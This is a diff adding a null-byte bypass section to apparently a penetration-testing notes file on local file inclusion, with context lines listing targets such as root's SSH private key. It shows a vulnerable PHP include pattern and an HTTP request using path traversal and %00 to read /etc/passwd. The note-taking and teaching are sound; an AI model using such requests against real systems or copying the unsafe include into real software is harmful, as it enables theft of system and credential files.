@@ -20,3 +20,19 @@ ffuf -w /usr/share/wordlists/lfi.txt -u http://preprod-marketing.trick.htb/index
 | /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                 |
 | /var/log/apache2/access.log | The accessed requests for Apache  webserver                                                            |
 | C:\boot.ini                 | Contains the boot options for computers with BIOS firmware                                                    |
+
+### Test if null bytes can be used to bypass file extensions
+It may be possible to override the end of the include statement by sending a null byte which tricks the application to disregard anything after it. `%00` (Url encoded) or `0x00` (Hex).
+
+An include like this 
+
+```php
+include($_GET["filename"] . ".php");
+```
+
+Could be vulnerable to an attack like this. (Fixed in PHP 5.3.4 and above.)
+
+
+```HTTP
+GET http://site.com/index.php?filename=../../../../etc/passwd%00
+```
